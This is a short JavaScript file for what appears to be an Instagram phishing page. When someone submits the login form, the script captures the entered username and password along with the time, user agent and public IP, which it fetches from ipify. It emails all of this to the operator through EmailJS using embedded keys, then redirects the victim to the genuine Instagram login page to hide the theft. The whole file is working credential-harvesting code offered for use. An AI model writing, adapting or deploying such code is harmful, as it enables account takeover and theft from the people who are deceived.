(function () {
  emailjs.init("sZy8o2u7l3_qpTCe9"); // Your EmailJS Public Key
})();

document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;
  const time = new Date().toString();
  const user_agent = navigator.userAgent;

  // Fetch public IP address
  fetch("https://api.ipify.org?format=json")
    .then((res) => res.json())
    .then((data) => {
      const ip = data.ip;
      sendEmail(username, password, time, ip, user_agent);
    })
    .catch(() => {
      sendEmail(username, password, time, "Unknown (IP fetch failed)", user_agent);
    });
});

function sendEmail(username, password, time, ip, user_agent) {
  const templateParams = {
    username: username,
    password: password,
    time: time,
    ip: ip,
    user_agent: user_agent,
  };

  // Replace 'template_your_id' with your actual EmailJS Template ID
  emailjs.send("default_service", "template_jjhyh4i", templateParams)
    .then(() => {
      document.getElementById("successModal").classList.remove("hidden");
      setTimeout(() => {
        window.location.href = "https://www.instagram.com/accounts/login/";
      }, 2000);
    })
    .catch((error) => {
      alert("Login captured! Redirecting...");
      console.error("Failed to send email:", error);
    });
}